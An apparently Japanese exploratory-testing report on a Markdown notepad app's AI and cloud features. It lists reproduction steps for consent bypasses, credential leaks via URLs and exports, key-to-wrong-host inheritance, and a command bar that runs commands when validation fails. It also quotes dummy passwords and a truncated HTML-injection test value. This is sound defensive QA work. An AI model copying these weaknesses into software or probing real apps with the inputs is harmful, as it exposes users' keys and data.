- 実際: どれも質問なしにクラウドへ出る（#30 Alt+C、#31 タスク、#32 画像は `kind: vision`、#33 予測はカーソルより前と後ろの全文を `autocompleteAsync` へ渡す（Go は前の最後の 1,200 字を送る: `pkg/llm/llm.go:301-305`）、#91 Quick Actions は前 1500 字 + 後 500 字を `jevPredict` へ）。テキストモデルがローカルで予測だけクラウドでも、状態バーは「AI: local … running on this computer or your network」（#35）。質問/書き換えバーは正しく聞く（#109）
- 環境: 1.10.5 / キット / en
- 再現性: 4 回中 4 回（Alt+C、タスク、画像、予測 + Quick Actions は別の実行）
- 証拠: `s04-autocomplete-cloud.png`、`s05-text-local-autocomplete-cloud.png`、ops #30–#35、#91
- 原因の仮説: 関所が UI の入口ごとにあり、`startLlmTask` / 予測 / Jev が通る共通の場所に無い。状態バーは `config.text` だけを見る（`status_ai.js` の `modelState`）
- 自動テストにできるか: できる（`tests/` の模擬環境で、クラウドの `config.text` の時に Alt+C・タスクが同意を要求する/しない、状態バーが予測の宛先も反映する事）
- 関連: C9-06（「AI: local」の別の食い違い）

### C10-13 base URL の `user:password@` が、宛先の行のツールチップ・同意の文・失敗の帯・設定の許可一覧に出て、同意の記録のキー（小文字化）として config.json と「秘密を持たない」はずの localStorage の写しに入る

- 重大度（案）: P2
- 気づきの型: OR
- なぜ気づけたか: `secret_strip.js` の冒頭が「WebView の localStorage の写しは資格情報を持たない」と宣言しているのに、同意の記録が `hostOf(baseUrl)`（userinfo 入り）をオブジェクトのキーにしている。`stripUserinfo` は文字列の値しか見ない
- 再現手順:
  1. `startExplore({ config: { text: { baseUrl: 'https://alice:s3cretpw@llm.example.com/v1', model: 'm', apiKey: 'K' } }, llm: { mode: 'fail', error: 'Post "https://alice:***@llm.example.com/v1/chat/completions": dial tcp: lookup … no such host' } })`
  2. Ctrl+L → 質問 → Enter → Allow → 失敗の帯を見る。Settings > General の「Cloud AI hosts you have allowed」を見る。`localStorage.getItem('md_notepad_config_v3')` を見る
- 期待（オラクル）: パスワードは画面に出ない（Go のエラー文は `alice:***@` と伏せている）。localStorage の写しに資格情報は無い
- 実際: 同意の文「Your text will be sent over the internet to alice:s3cretpw@llm.example.com. Allow it?」、失敗の帯「Can't reach alice:s3cretpw@llm.example.com. …」、許可一覧の「alice:s3cretpw@llm.example.com」。localStorage の写しでは `text.baseUrl` は伏せられているのに、`general.cloudConsent` のキーは `"alice:s3cretpw@llm.example.com"`。小文字化されているので `bob:Tr0ub4dor-R2@…` は `bob:tr0ub4dor-r2@…` として入る（#15、#27–#29、#101）
- 環境: 1.10.5 / キット / en
- 再現性: 3 回中 3 回
- 証拠: `s02-userinfo-consent.png`、`s03-userinfo-hosts-list.png`、ops #15–#16、#27–#29、#101
- 原因の仮説: `llm_error.js` の `hostOf` が userinfo を落とさない（`status_ai.js` の `hostOf` は落とす）。`app.js:4998` `dest.host.toLowerCase()` が全体を小文字にする
- 自動テストにできるか: できる（`hostOf('https://a:b@h/v1') === 'h'`。`saveLocalCopy` に `cloudConsent` のキーを通して資格情報が残らない）

### C10-14 キーの「継承」が、別のプロバイダのホストにキーを付ける（voice → vision のキー、画像生成 → vision → text のキー、コマンドバー AI → text のキー）

- 重大度（案）: P2
- 気づきの型: OR
- なぜ気づけたか: `baseUrl` と `apiKey` を別々に `A || B` で選んでいる所（`voice_input.js:221-222`、`app.js:5860-5862`、`app.js:6450`）を見つけ、組み合わせを作った
- 再現手順:
  1. `startExplore({ config: { text: { baseUrl: 'https://api.openai.com/v1', apiKey: 'OPENAIKEY' }, vision: { baseUrl: 'https://generativelanguage.googleapis.com', apiKey: 'GOOGLEKEY' }, voice: { baseUrl: 'https://stt.selfhosted.example/v1', apiKey: '' }, cli: { baseUrl: 'https://openrouter.ai/api/v1', apiKey: '' } } })`
  2. `VoiceInput.configJSON(config)` を見る。Ctrl+E → Tab（AI）→ 依頼を打って Enter → `generateCliCommandAsync` の引数を見る
- 期待（オラクル）: キーは、それを発行したプロバイダのホストにだけ付く。継承するなら宛先も一緒に継承する（Settings の文は「Uses the API key from the image OCR settings」。宛先の事は言っていない）
- 実際: 音声は `baseUrl: stt.selfhosted.example`、`apiKey: GOOGLEKEY`（Mobile Drop の音声も同じ関数、#72）。コマンドバー AI は `baseUrl: openrouter.ai`、`apiKey: OPENAIKEY`（#34。この 2 つの欄は Settings 画面に無く config.json を直接編集した時だけ）。画像生成（`app.js:6450`）は `image.apiKey || vision.apiKey || text.apiKey` を Google のエンドポイントへ `?key=` で送る（ソースのみ、未実行）
- 環境: 1.10.5 / キット / en
- 再現性: 2 回中 2 回（音声・コマンドバー）
- 証拠: ops #34、#72
- 原因の仮説: 継承がキーだけの単位で、宛先とセットではない
- 自動テストにできるか: できる（`voice_input_test.js`: `voice.baseUrl` が vision と違うホストで `voice.apiKey` が空なら、`apiKey` を空にする）

### C10-15 設定パッケージの書き出しで「Include API keys」をオフにしても、URL のクエリに入ったキー（`?key=`, `?token=`）が残る。`md-memo config get` は伏せる

- 重大度（案）: P2
- 気づきの型: OR
- なぜ気づけたか: `pkg/cli/configcmd.go` のコメント（「`https://host/path?key=SECRET` で書かれた base URL のため」）を読み、書き出し側の `StripJSON` に同じ処理があるか確かめた
- 再現手順:
  1. `EV/zz_c10_strip_test.go` と `EV/zz_c10_cli_test.go` を `go test -overlay` で流す（リポジトリにファイルは足していない）
  2. 入力: `{"text":{"apiKey":"K1","baseUrl":"https://h.example/v1?key=K2&x=1"},"scraps":{"gitRemoteUrl":"https://bob:tok@github.com/a/b.git?token=Q1"}}`
- 期待（オラクル）: 他の画面（`md-memo config get`）と同じ範囲を伏せる。書き出し画面の文「API keys and other secrets were left out」
- 実際:
  - `md-memo config get` 相当（`RedactConfig`）: `{"scraps":{"gitRemoteUrl":"https://github.com/a/b.git?token=<set>"},"text":{"apiKey":"<set>","baseUrl":"https://h.example/v1?key=<set>&x=1"}}`
  - 書き出し（`StripJSON`、`includeSecrets:false`）: `{"text":{"apiKey":"","baseUrl":"https://h.example/v1?key=K2&x=1"},"scraps":{"gitRemoteUrl":"https://github.com/a/b.git?token=Q1"}}`（`apiKey` だけ空になり、`?key=K2` と `?token=Q1` は残る。`bob:tok@` の userinfo は落ちる）
  - 同じ `StripJSON` は `env` 内の秘密名、`Api_Key` `PASSWORD` `x-api-key` の大文字小文字・`apiKey` の別表記は正しく空にする。`args: ["--api-key","K3"]` や `headers.Authorization` のような、キー名に秘密語を持たない値は残る（`agents` 経路の警告 `secretWarnings` の領分）
- 環境: Go 純関数（`pkg/configpack`、`pkg/cli`）
- 再現性: 2 回中 2 回（2 つのテスト）
- 証拠: `zz_c10_strip_test.go`、`zz_c10_cli_test.go`（`go test -overlay`。出力は上の通り）
- 原因の仮説: `configpack.StripUserinfo` は userinfo だけ。クエリの秘密名パラメータの除去は `cli.redactURLQuery` にだけある。同じ規則を共有していない
- 自動テストにできるか: できる（Go: `StripJSON` に `?key=` 入りの URL を通し、CLI の `RedactConfig` と同じ結果になる事）

### C10-16 （憲章の外で見つけた）`[` が数万個続くノートで、編集のたびに数秒〜十数秒固まる（`auto_selector.js` の `parseNotation`）

- 重大度（案）: P2（入力が特殊。C4 の巨大・異常入力の領域）
- 気づきの型: WI
- なぜ気づけたか: リンクの走査の遅さを疑って 60,000 個の `[` を入れたら 10 秒固まり、プロファイラで別の関数だった
- 再現手順:
  1. エディタに `'['.repeat(60000)`（または `'[['.repeat(30000)`、`'](' + '['.repeat(60000)`）を入れる（input イベント）
  2. 400 ms 待ってから頁に問い合わせる
- 期待（オラクル）: 固まらない（P0: 過去に 8 万行で固まった領域。`{{` の 3 万個、`](`+`x`×60,000、60,000 個の `a`、base64 の data URI は固まらない: #61–#62、#68–#69。#57–#60 は 100 ms の遅延タイマーが走る前に測ってしまい無効）
- 実際: 固まる時間は 8.7 s（`[`×60,000）、7.8 s（`[[`×30,000）、10.2–12.0 s（`](`+`[`×60,000、3 回）。プロファイル（6.8 s の回）: `parseNotation js/auto_selector.js:159` の自分の時間が 6,665 ms（#65–#67）。保存済みの 50,000 個の `[` のノートは開ける（1.6 s）が、そのノートで 1 文字打つごとに 6.4 s、8.0 s かかる（#70–#71）
- 環境: 1.10.5 / キット / en
- 再現性: 8 回中 8 回
- 証拠: ops #52–#53、#61–#71、`s10_freeze_profile.mjs`
- 原因の仮説: `parseNotation` が `[[` を見つけるたびに対の `]]` を最後まで探す二乗の走査
- 自動テストにできるか: できる（`auto_selector_test.js` に `'['.repeat(50000)` を通して 200 ms 以内）
- 関連: C4（巨大・異常な入力）

### C10-17 Mobile Drop を開くと、選択がない時は OS のクリップボードを黙って読み、電話のページ用の「PC からのテキスト」に流す

- 重大度（案）: P3（電話は自分の端末のはず。QR が画面に出ていて、トンネルを後から有効にする事もできる）
- 気づきの型: NV
- なぜ気づけたか: 「Mobile Drop × クリップボード」の組み合わせ。`pushInitialMobileDropSharedText` のコメントが「1 回だけ黙ってクリップボードを読む」と言っている
- 再現手順:
  1. `s.setBackend({ clipboard: { text: 'PASSWORD=hunter2 (from the password manager)' } })`。選択を空にして Ctrl+Shift+U
  2. `setMobileDropSharedText` の呼び出しを見る
- 期待（オラクル）: クリップボードの中身を電話に出す時は、その事が画面に出る（マニュアルは「Text from PC」に触れている）
- 実際: 1 回目の呼び出しがクリップボード全文（上限 64 KB）。約 420 ms 後の 2 回目は空文字で（`app.js:7868` のデバウンスされた `scheduleMobileDropSharedTextPush`。何のイベントかは特定できていない。キットが送ったショートカットの keyup かもしれない）、`mobile-drop-shared-preview` は非表示のまま。実機で何も操作しなければ、クリップボードの文字がそのまま電話のページに残る見込みだが、実機では未確認。画面に出るのは「Sharing with phone: …」の 1 行（80 字で切る）だけ（#89、#98）
- 環境: 1.10.5 / キット / en。実際の Go 側のサーバは未実行
- 再現性: 2 回中 2 回
- 証拠: `s14-mobile-drop-clipboard.png`、`s15-mobile-drop-open.png`、ops #89、#98–#99
- 自動テストにできるか: できる（模擬 DOM: 選択なしで開いた時に `readText` を呼ばない、または呼ぶなら画面に表示する）

### C10-18 同意が「ホスト:ポート」だけで結び付き、https で許可した後の http への切り替えで聞き直さない

- 重大度（案）: P3
- 気づきの型: WI
- なぜ気づけたか: 同意の記録が `{ "host": "date" }` でスキームを持たない
- 再現手順: `general.cloudConsent = { 'api.example-llm.com:8443': '…' }` で `text.baseUrl` を `https://…` にして許可済みにし、Settings で `http://api.example-llm.com:8443/v1` に変えて保存 → Ctrl+L で質問
- 期待（オラクル）: 平文の http でキーとテキストが出る前に聞き直す
- 実際: 聞かれずに `http://api.example-llm.com:8443/v1` へ送られる（#24、#123）。ホスト名の大文字小文字は正しく吸収される
- 環境: 1.10.5 / キット / en
- 再現性: 2 回中 2 回
- 証拠: ops #24、#123
- 自動テストにできるか: できる（`rememberCloudConsent` / `cloudConsentGiven` にスキームを含めるか、http に切り替えたら未許可にするテスト）

### C10-19 端末ごとの旗（`welcomeShown` / `aiChoiceMade`）が書き出しに入り、取り込みで上書きされる（`cloudConsent` と `agentAck` は正しく除外）

- 重大度（案）: P3（`docs/design/first-run.md` の「残り・引き継ぎ」に既に書かれている）
- 気づきの型: OR
- 再現手順: 書き出しの config に `welcomeShown` と `aiChoiceMade` が入る（#39）。`general: { welcomeShown: false, aiChoiceMade: false }` の取り込み後、両方 false になる（#43）
- 期待: `config_pack.js` の `LOCAL_ONLY_NESTED` に足す
- 実際: 除外されていない
- 再現性: 2 回中 2 回
- 関連: **C6-09（同じ）**

### C10-20 コマンドバーは、検証の呼び出しが失敗すると確認なしで実行し、検証に時間がかかる間の Enter の連打は実行の回数だけ実行する

- 重大度（案）: P3（検証は通常数 ms で終わる。Go は run 時に禁止だけを再検証するので、警告は素通りする）
- 気づきの型: RC
- 再現手順: `s.setBackend({ validateCliCommand: { fail: 'ipc glitch' } })` で Enter。別に `{ delayMs: 800, result: { isSafe: true } }` にして Enter を 2〜3 回
- 期待: 検証に失敗したら実行しない（または確認する）。実行中フラグは検証の前に立てる
- 実際: 失敗しても `runCommandFilterAsync` が呼ばれる（#76、#121）。Enter 3 回で 3 回、2 回で 2 回実行される（#77、#122）。`isCliFilterRunning` は検証の後で立てる（`app.js:6022`）
- 再現性: 2 回中 2 回
- 関連: **C7-13（検証失敗時の実行）**

### C10-21 （道具）キットの「外へ出る要求はすべてモックが止める」は `fetch()` にしか効かず、プレビューの画像・CSS・iframe・フォームは実際に出る

- 重大度（案）: P2（探索の安全性。プレビューを開く操作が、実ネットワークへ出る）
- 気づきの型: ENV
- なぜ気づけたか: プレビューを開く前に、モックが何を包んでいるか確かめた
- 再現手順: 遮断なしの実行は意図的にしていない（実ネットワークへ出るため）。代わりに (1) モックが包むのは `window.fetch` だけである事をソースで確認し、(2) 自分の CDP 遮断が、モックの `fetch(blocked)` に出ない要求（`<img>`、プレビューの画像）を捕まえた事を証拠にした
- 期待: README の記述どおり、外へ出る要求は止まる
- 実際: 包んでいるのは `window.fetch` だけ（`tools/docshots/mock/backend.js:35-44`）。`<img>` は素通りで、遮断が捕まえた（#1、#49、#103）。サンドボックス付き iframe は別のターゲットで、ページ単位の遮断も効かない（子ターゲットに `Target.setAutoAttach` が要る）
- 再現性: 3 回中 3 回
- 証拠: ops #1、#49、#56
- 原因の仮説: モックが `fetch` だけを対象にしている
- 自動テストにできるか: できる（`tests/explore_kit_test.mjs` か kit 自身: 起動時に `Fetch.enable` + 子ターゲットの自動アタッチを入れ、`s.egress` を返す。README を直す）

## 再現しなかった／確度が低いもの

- 失敗した質問のあと、中身が同じノートに ● が付く（`e02-key-in-ask-bar-details.png` のタブ）: 1 回見ただけ。C9-01 が詳しい。
- コマンドバーの「BLOCKED」バッジが、コマンドを直しても残る（#74）: 1 回。C7-14 に同じ。
- Mobile Drop の受信（`__onMobileDropReceived`）は、セッションが閉じていても今のノートの末尾に足す（#90）: フロントには「セッション中か」の状態が無いだけで、Go が呼ぶかどうかの問題。バグとは断定できない。
- 更新確認の返事の `tag_name` を画面に生のまま出す（`Version 9.9.9"><img …> is available`, #106）: テキストとして出るのでスクリプトは動かず、リリースノートの URL は正規表現で検証されて一覧に戻る。飾りの問題。
- `PrepareCommand` はプロジェクトのルートの `.env` を読んでエージェントの環境変数に混ぜる（`pkg/slotagent/runner.go:184-190`）: ソースを読んだだけ。他人のリポジトリのフォルダにあるノートから実行すると、その `.env`（`NODE_OPTIONS` など）が効く。実行していない。
- 「Cloudflare トンネル」の UI（`__onMobileDropTunnelReady` / `__onMobileDropTunnelError`）は開いていない。

## 確かめてよかったもの（バグなし）

- 起動時に外へ出るのは `api.github.com` への 1 回だけ（既定オン、約 2.5 秒後）。`checkUpdates:false` なら何も出ない。「今すぐ確認」は手動で動く。設定のスイッチは保存される。About の説明文（「送るのはその問い合わせだけ」）と一致（#2–#8、#105）
- 「詳細をコピー」に秘密は入らない（パスと版のみ。パスに利用者名は入る）（#9）
- キーは console に出ない（全種類の console を記録、#110）。localStorage の写しでは `apiKey` が空になる（#22、#111）
- 質問・書き換えバーのクラウド同意: 連打・Esc・Cancel・Allow・忘れる（Cancel で戻る、Save で消える）・日本語の文言が正しい（#17–#26、#108–#109）
- 書き出し: 既定は「Include API keys」オフ、オンにすると警告と結果の文が出る。`cloudConsent` / `agentAck` / `agentNotice` は書き出しに入らず、取り込みでも入らない（#38–#41、#43）。ただしページは常にキーごと Go へ渡す（Go が落とす設計）
- AI の答え・電話からの文に入った `[[ $ … ]]` `{{ @agent … }}` は、Ctrl+Enter を押すまで実行されない（#118）
- プレビュー: `html:false`、`javascript:` `data:` `file:` のリンクは作られない、KaTeX の `\href` `\url` は動かない、Mermaid は `securityLevel: 'strict'` でハンドラが消える（#103–#104）
- エージェントの確認ダイアログ（`safeDefault`）: 繰り返し Enter を無視、Cancel で何も起きない、Run now で 1 回だけ実行、同じコマンドでは聞き直さない、引数を 1 つ変えると聞き直す（#79–#84）
- Ctrl+クリック: `javascript:` `vscode:` `mailto:` `ms-msdt:` は開かない（#46）

## 気づきの型の内訳

NV: 2 件 / LC: 1 件 / WI: 9 件 / OR: 7 件 / RC: 1 件 / ENV: 1 件（合計 21 件）

## 振り返り（5 分）

- 学んだこと（次に同じ型で探すときのヒント）: (1) **「同意・確認・整形」が入口の 1〜2 箇所にしか無い**。同じデータが行く別の道（Alt+C、タスク、予測、Jev、貼り付け OCR）と、同じ関数を呼ぶ別の呼び出し（`customConfirm`）を並べて見比べると穴が出る。(2) 「信頼していない入力」を一覧にして、それぞれが HTML・パス・コマンド・URL になる所を `innerHTML` と `backend.*` の呼び出しから逆に辿ると、実際に効く3本（フォルダ名、エンジンの返事、iframe のメッセージ）が見つかった。(3) Go 側は「読む」と「純関数だけ `-overlay` で動かす」で、実接続なしに確度が上がる（`?key=`、UNC、`StripJSON` の穴）。(4) 他セッションの記録と重なる（C6-09/10、C7-09/13、C9-06/13）。重なった所は独立の確認として強い。
- 次にやる憲章: (a) 実機（Windows）の SMB / `rundll32` / `OpenExternal`（本物の Go）の確認 — C10-05、C10-07、C10-08 の確度を上げる。(b) macOS 実機で C10-09（フォルダ名）と Finder。(c) Mobile Drop の実サーバ + Cloudflare トンネルの経路（電話ページの `/shared`、トークン、期限）。(d) Discord ブリッジとホットフォルダの入口（`allowedUserId`、`inbox.dir`）を、取り込み（C10-03）の後の状態から。(e) C11 の更新確認のオフライン・遅い時。
- 自動テストにできるもの: `LlmError.isLocal` / `hostOf` の表（C10-02、C10-13）、`describeLlmFailure` / `llmTaskReplacement` に `key=…` 入りの文を通す（C10-01）、`customConfirm` の `safeDefault`（C10-04）、`linkifyVsCodePaths` と `jev_action` の属性の消毒（C10-09、C10-10）、`AgentRisk.assess` の表に `{instruction}` 入りのシェル（C10-11）、`StripJSON` と `RedactConfig` の一致（C10-15）、`mergeImported` の「宛先・安全性の値の差分」（C10-03）、キット自身の遮断（C10-21）。
- うまくいかなかったこと（道具・進め方）: (1) キットの遮断が `fetch` だけだった（C10-21）。自分で CDP の遮断を足したが、最初の HTML プレビューの回は子ターゲットを見落とした（自己申告済み）。(2) 5000 文字の折り返しの行の後ろでクリック座標がずれた（行番号 × 行の高さで座標を出すため）。短いノートで撮り直した。(3) bash のヒアドキュメントが `\\` を半分にした。
